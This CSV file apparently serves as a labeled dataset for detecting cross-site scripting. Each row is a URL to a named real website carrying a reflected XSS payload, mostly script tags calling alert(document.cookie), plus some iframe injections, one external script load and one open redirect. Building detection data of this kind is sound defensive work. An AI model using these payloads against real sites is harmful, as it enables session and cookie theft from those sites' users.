Sentence,Type
http://www.motorsale.ru/search/?searchtxt=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.memorec.ru/register.php?sesid=blah'%3etest%3c/a%3e%3cscript%3ealert(document.cookie);%3c/<br>script%3e,Malicious
http://ga1.org/ntu_action/join.tcl?qp_source=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.thetaxreliefsite.com/?refid=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://enable.nat.gov.tw/valid.jsp?category=testicles%22%3ea%3c/a%3e%3cscript%3ealert(document.cooki<br>e);%3c/script%3e,Malicious
http://www.knoxcounty.org/search/sresults.php?search=%22%29%3balert%28document.cookie%29%3b%2f%2f,Malicious
http://www.globalgateway.com/search.asp?criteria=%3cscript%3ealert%28document.cookie%29%3b%3c%2fscri<br>pt%3e,Malicious
http://ipcat.leeds.ac.uk/do_search.asp?dosearch=search&amp;title=%3cscript%3ealert%28document.cookie%29%<br>3b%3c%2fscript%3e&amp;titlekeywords=&amp;publisherkeywords=&amp;issuingkeywords=&amp;issn=&amp;library=,Malicious
http://www.marinesanctuariesmedia.com/search.php?keyword=%3cscript%3ealert(document.cookie);%3c/scri<br>pt%3e,Malicious
http://www.cameraforless.com/search.asp?keyword=%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.projusticia.org.pe/site.php?plantilla=busqueda&amp;txt_filtro=%3cscript%3ealert%28document.co<br>okie%29%3b%3c%2fscript%3e,Malicious
http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&amp;texto=%3cscript%3ealert(document.cookie);%3c/s<br>cript%3e,Malicious
http://www.vbulletin.org/forum/forumdisplay.php?f=228&amp;threadprefix=%3cscript%3ealert(document.cookie<br>);%3c/script%3e,Malicious
http://search.moh.gov.my/i/?s=1169536581265&amp;p=&lt;/title&gt;&lt;iframe+src=http://google.com&gt;,Malicious
http://bologna.annuncinetwork.com/search.php?keyword=%22%3e%3cscript%3ealert(document.cookie);%3c/sc<br>ript%3e,Malicious
http://uk.singerspro.com/search_all.php?uid=&amp;name=&amp;keyword='&gt;&lt;script&gt;alert(document.cookie);&lt;/script<br>&gt;,Malicious
http://www.tax.virginia.gov/site.cfm?alias=&quot;&gt;&lt;/a&gt;&lt;iframe+src=http://google.com&gt;,Malicious
http://www.gameinw.com/pageth.php?keyword=%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://webindex.giggog.com/search.php?keyword=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fs<br>cript%3e,Malicious
http://tiempo.meteored.com/buscar.php?criterio=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://db.th.gov.tw/phorum/login.php?f=0&amp;target=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://register.typc.doh.gov.tw/netreg/choosedep.asp?mode=%22%3e%3cframe%20src=%22javascript:alert('<br>pappy was here');%22%3e%3c/frameset%3e&amp;subseq=y,Malicious
http://epaper.vac.gov.tw/admin/web/content.php?mc_sn=45&amp;ts_sn=%3cscript%3ealert(document.cookie);%3c<br>/script%3e,Malicious
"http://www.kccc.gov.tw/cgi/searcher.exe?s=1&amp;o=3&amp;f=1&amp;t=2&amp;a=15&amp;k=1,&amp;g=0&amp;mergefield=-&amp;codeconvert=-&amp;sor<br>tfields=1&amp;sim_start=1&amp;sim_num=10&amp;rel_start=1&amp;rel_num=10&amp;link=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/scri<br>pt&gt;&amp;redirectto=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;pathlink=-&amp;p=%a6~%a5%cd&amp;b=16&amp;page=20",Malicious
http://www.lugu.gov.tw/4images/register.php?sessionid=&quot;&gt;&lt;iframe src=http://google.com&gt;&lt;!--,Malicious
http://www.mjob.in.th/search1_result.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;jobtype=<br>&amp;province=,Malicious
http://www.autosanjuan.com.ar/busqueda.php?x=0&amp;y=0&amp;anio_desde=%27%3e%3c%2fa%3e%3cscript%3ealert%28do<br>cument.cookie%29%3b%3c%2fscript%3e&amp;anio_hasta=&amp;km_desde=&amp;km_hasta=&amp;precio_desde=&amp;precio_hasta=&amp;tipo=<br>+++++++++1&amp;marca=0&amp;modelo=0&amp;estado=0&amp;segmento=0&amp;combustible=0&amp;tipo_vendedor=0&amp;ubicacion=0,Malicious
http://cardealerforums.com/car-dealer-forum-news/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/sc<br>ript&gt;,Malicious
http://www.netstumbler.org/f55/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
https://www.albemarle.org/department.asp?department=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.mcseboard.de/windows-forum-lan-wan-32/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/sc<br>ript&gt;,Malicious
http://www.prenatalyogacenter.com/forums/introduce-yourself/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.c<br>ookie);&lt;/script&gt;,Malicious
http://vbmodder.com/forums/f26/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.experienceadvertising.com/forum/f47/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/scri<br>pt&gt;,Malicious
http://rg-rb.de/search/?keywords=&quot;&gt;a&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://gojeebus.com/search.php?keyword=&lt;/title&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://board.jokeroo.com/announcements/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cookie)%3b%3c%2fscr<br>ipt%3e,Malicious
http://medical-dictionary.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cook<br>ie)%3b%3c%2fscript%3e,Malicious
http://legal-dictionary.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cookie<br>)%3b%3c%2fscript%3e,Malicious
http://financial-dictionary.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.co<br>okie)%3b%3c%2fscript%3e,Malicious
http://idioms.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cookie)%3b%3c%2f<br>script%3e,Malicious
http://encyclopedia2.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cookie)%3<br>b%3c%2fscript%3e,Malicious
http://encyclopedia.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cookie)%3b<br>%3c%2fscript%3e,Malicious
http://creditcardforum.com/finance-charges-apr-compare/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie<br>);&lt;/script&gt;,Malicious
http://english.nyc.gov.tw/simple_search.php?sn=&amp;act=&amp;search1=%22%3e%3cscript%3ealert%28document.cook<br>ie%29%3b%3c%2fscript%3e&amp;linkw=and&amp;search2=&amp;time_limit=all&amp;resu_num=10&amp;hl=en&amp;btng=nyc%27s+search,Malicious
http://www.activedayton.com/beavercreek/restaurants/145605/usercomment.jspd?id=145605&amp;activity=ratin<br>g&amp;searchcriteriaurl=c2l0zwlkptexmdembglzdgluz3r5cgu9mtawmdembmvpz2hib3job29kawq9mtazndqwjmn1cnjlbnrw<br>ywdlpti=&amp;searchtype=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.gnutellaforums.com/getting-started-using-limewire/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.<br>cookie);&lt;/script&gt;,Malicious
http://www.austintamilsangam.org/modules/xoogle/index.php?query=%22%3e%3c%2fa%3e%3cscript%3ealert%28<br>document.cookie%29%3b%3c%2fscript%3e&amp;search=web&amp;lr=lang_zh-tw,Malicious
http://www.gaystudenterna.se/sfg/search.php?query=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://absolutdrinks.com/community/login.aspx?chk=&amp;q=&amp;x=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;0&amp;<br>y=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;0,Malicious
http://www.vbhackers.com/f104/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://pkgsrc.se/search.php?so=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fscript%3e,Malicious
http://archive.netbsd.se/search.php?ml=%3c/a%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.ecoogler.com/search.php?keyword=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fscri<br>pt%3e&amp;btng=search&amp;mtk=uk&amp;enviado=1&amp;s=0&amp;n=10,Malicious
http://www.mambers.com/general-announcements/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script<br>&gt;,Malicious
http://www.energy-enviro.fi/index.php?page=1506&amp;printarea=%3cscript%3ealert(document.cookie);%3c/scr<br>ipt%3e,Malicious
http://www.ourfreeonlinelayouts.info/generators/myspace-layout-code.php&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.masslottery.com/cgi-bin/search_dir/search.cgi?q=&quot;&gt;&lt;script&gt;alert('zomg pappy won the<br>lottery!');&lt;/script&gt;&amp;e=1&amp;x=0,Malicious
http://tlogr.com/testmb.php?keywords=%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.yiparts.com/world/search.php?ie=utf-8&amp;oe=utf-8&amp;hl=en&amp;q=%22%3e%3cscript%3ealert%28document<br>.cookie%29%3b%3c%2fscript%3e&amp;sitesearch=www.yiparts.com&amp;submit2=website+search,Malicious
http://valeriu.clipta.com/search.php?q=%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://news.giggog.com/search.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.opensecrets.org/indivs/donor_lookup.php?name=%3cscript%3ealert(document.cookie);%3c/scrip<br>t%3e,Malicious
http://search.ieice.org/bin/fulltext_search.php?key=%22%3e%3cscript%3ealert%28document.cookie%29%3b%<br>3c%2fscript%3e&amp;dosearch=search&amp;e_index_a=on&amp;e_index_b=on&amp;e_index_c=on&amp;e_index_d=on&amp;e_index_e=on&amp;j_e_<br>index_a=on&amp;j_e_index_b=on&amp;j_e_index_c=on&amp;j_e_index_d=on&amp;lang=e,Malicious
http://www3.marketwatch.com/store/default.aspx?dist=&amp;siteid=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/s<br>cript&gt;,Malicious
http://bigcharts.marketwatch.com/symbollookup/symbollookupresults.asp?symb=%22');alert(document.cook<br>ie);//&amp;country=all&amp;type=all,Malicious
http://www.globalgateway.com/addurl.asp?category=12&amp;cfile=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/scr<br>ipt&gt;,Malicious
http://forum.vbulletinsetup.com/f4/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://wdfw.wa.gov/fish/ans/identify/search.php?searchby=speciesfamilycategory&amp;search=&quot;&gt;&lt;/a&gt;&lt;script&gt;<br>alert(document.cookie);&lt;/script&gt;,Malicious
http://info4-entertainment.com/search.php?keyword=%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://s-e-arch.com/search.php?keyword=%3c/title%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://citationmachine.net/index.php?page=%3e%3c/a%3e%3cscript%3ealert(document.cookie);%3c/script%3<br>e,Malicious
http://www.storage-academy.com/new_academy/register.php?id=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/sc<br>ript&gt;,Malicious
http://my.hardwarezone.com/core/search.php?submit.x=1&amp;submit.y=1&amp;q=%3cscript%3ealert(document.cookie<br>);%3c/script%3e,Malicious
http://cookingwithsql.com/tinystats/domainlinks.php?thedomain=%3ciframe+src=http://google.com&gt;,Malicious
http://www.belstat.com/viewtab_se.asp?userid=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.libcat.oxfordshire.gov.uk/cgi-bin/vps2.5_viewpoint.sh?enqtype=phrase&amp;authpara1=&quot;&gt;&lt;script&gt;<br>alert(document.cookie);&lt;/script&gt;,Malicious
http://www.catalogue.sefton.gov.uk/cgi-bin/viewpoint_server.sh?enqtype=phrase2&amp;authpara1=&quot;&gt;&lt;script&gt;a<br>lert(document.cookie);&lt;/script&gt;&amp;session_no=146663&amp;catsect=,Malicious
http://www.ibm.com/developerworks/views/global/tutorials.jsp?sort_by=title&amp;show_abstract=true&amp;zone_b<br>y=all+zones&amp;topic_by=all+topics&amp;search_by=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;submit.x=0&amp;subm<br>it.y=0,Malicious
http://galaxy.ealing.gov.uk/cgi-bin/vps2.5_viewpoint.sh?enqtype=authortitle&amp;enqpara1=default&amp;s_strin<br>g=testino%2c+mario&amp;s_type='a'&amp;no_of_results=9&amp;authorpage=0&amp;authorrecord=1&amp;sec_stng=&amp;media_stng=&amp;sess<br>ion_no=1443500&amp;time=7917&amp;page=-1&amp;search_string=%22%3e%3c/a%3e%3cscript%3ealert(document.cookie);%3c/<br>script%3e,Malicious
http://www.treadclimber.com/global/content_basic.jsp?folder%3c%3efolder_id=2534374302031664&amp;bmuid=12<br>13393925797&amp;adid=dsetdir&amp;originalhostname=&quot;;alert(document.cookie);//&amp;bmuid=1213393931143,Malicious
http://www.flymanchester.com/flightinfo/index.php?view=&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://botdb.abcc.ncifcrf.gov/seqanal/seqresults.jsp?extension=ssearch&amp;pbsid=&quot;&gt;&lt;script&gt;alert(documen<br>t.cookie);&lt;/script&gt;,Malicious
http://www.tcdb.org/tcdb/index.php?tc=&quot;&gt;&lt;frameset&gt;&lt;frame src=&quot;javascript:alert('xss');&quot;&gt;&lt;/frameset&gt;,Malicious
http://modern-empires.ej.am/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.workingtitlefilms.com/emailfriend.php?pageurl=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://tsla-teva.state.tn.us/cdm4/results.php?cisoop1=any&amp;cisofield1=cisosearchall&amp;cisoroot=&quot;&gt;&lt;/a&gt;te<br>sticles&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.ajp.com/title.php?ititlenum=4286&amp;artistid=--%3e%3cscript%3ealert(document.cookie);%3c/scr<br>ipt%3e,Malicious
http://environment-data.uchicago.edu/esintern/detail.cfm?jobid=%3cscript%3ealert(document.cookie);%3<br>c/script%3e,Malicious
http://www.srmg.com/templates/srmg/searchtemplate.aspx?postingid=317&amp;keywords=%3cscript%3ealert(docu<br>ment.cookie);%3c/script%3e,Malicious
http://www.metmeetings.org/?section=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.azleg.state.az.us/documentsforbill.asp?bill_number=%3ciframe+src=http://google.com%3e%3e&amp;<br>image.x=0&amp;image.y=0,Malicious
http://www.azleg.gov/documentsforbill.asp?bill_number=%3ciframe+src=http://google.com%3e%3e&amp;image.x=<br>0&amp;image.y=0,Malicious
http://www.abcteach.com/search.php?q=&quot;&gt;&lt;script/src=http://www.altan.hr/snow/snow1.js&gt;&lt;/script&gt;&amp;searc<br>h_type=1&amp;match_words=2&amp;limit_search=1&amp;_form_action=abcteach search&amp;search_form1_form_visited=1,Malicious
http://www.arabnews.com/?page=1&amp;section=0&amp;article=63138&amp;d=3&amp;m=5&amp;y=2005&amp;pix=%22%3ekingdom.jpg&amp;categor<br>y=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.bennadel.com/index.cfm?dax=--&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.bitenova.nl/s/0/<script>alert("phnjcmlwdd5hbgvydchkb2n1bwvudc5jb29rawupozwvc2nyaxb0pg..")<\script>,Malicious
http://www.keyworddensity.com/search_engine_optimization/keyword_density.cgi<br>y=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.nationwars.net/register_step1.php?ref=1'&gt;&lt;iframe%20src=http://google.com&gt;,Malicious
http://zetapets.com/register.php?ref=testicles&quot;&gt;a&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script,Malicious
http://vietany.com/home/utube.php?tag=php&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;!-- &amp;pageid=10,Malicious
http://www.thegreene.com/tenant.cfm?tenantid=50&amp;tenantspace=e9&amp;tenantx=-1180&amp;tenanty=-');alert('xss'<br>);//,Malicious
http://www.cosmeticscop.com/search/search.asp?keys=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;x=<br>0&amp;y=0,Malicious
http://myespn.go.com/myespn/includes/communityads?titlecolor=0;}&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(docum<br>ent.cookie);&lt;/script&gt;&amp;amp;bodycolor=boobs&amp;amp;urlcolor=balls&amp;amp;backcolor=penis&amp;amp;extpadcolor=dic<br>k&amp;amp;intpadcolor=testicles,Malicious
http://www.hsbc.co.uk/1/2/!ut/p/kcxml/04_sj9spykssy0xplmnmz0vm0y_qjzkln4l39gljmmu7xrub6kciixjeo8ifgv<br>s99x098nnt9qp0c3jdi8odhrubf0cb6a!!/delta/base64xml/l0lkayevd0znqurbisevnelfrs9jbnrlcm5hbfnlyxjjaa!!;<br>jsessionid=0000rszl-xicinnawwljlabjmjq:12ntf1n0a?sq=--%3etesticles&amp;st=1&amp;ssid=%22%3e%3cscript%3ealert<br>(document.cookie);%3c/script%3e&amp;stask=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3eeukuka00<br>01,Malicious
http://walkmyplank.net/login.php?lgc=%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.pornbits.com/?sb=--&gt;&quot;;&lt;/script&gt;&quot;&gt;\\&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://informe.com/category/0/all?field=title&amp;searchstring=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script<br>&gt;&amp;x=0&amp;y=0,Malicious
http://mlb.mlb.com/components/global/click_through.html?jumpto=http://google.com,Malicious
http://users.gametrailers.com/password_reset_script.php?input[email]=&amp;input[hash]=--%3e%3cscript%3ea<br>lert(document.cookie);%3c/script%3e,Malicious
http://www.nstalker.com/nstalker/updates/index.php?code=9e99c11a228c55c803e45a4101448946;--&gt;&lt;script&gt;<br>alert(document.cookie);&lt;/script&gt;,Malicious
http://mlb.mlb.com/mlb/sweepstakes/y2008/state_farm/callyourshot_sweeps.jsp?sf_ref=%22%3e%3cscript%3<br>ealert(document.cookie);%3c/script%3e&amp;partnerid=s00468,Malicious
http://boston.redsox.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy was here');&lt;/script&gt;,Malicious
http://chicago.whitesox.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://baltimore.orioles.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://cleveland.indians.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://detroit.tigers.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://kansascity.royals.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://losangeles.angels.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://minnesota.twins.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://oakland.athletics.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://seattle.mariners.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://tampabay.rays.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://texas.rangers.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://toronto.bluejays.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
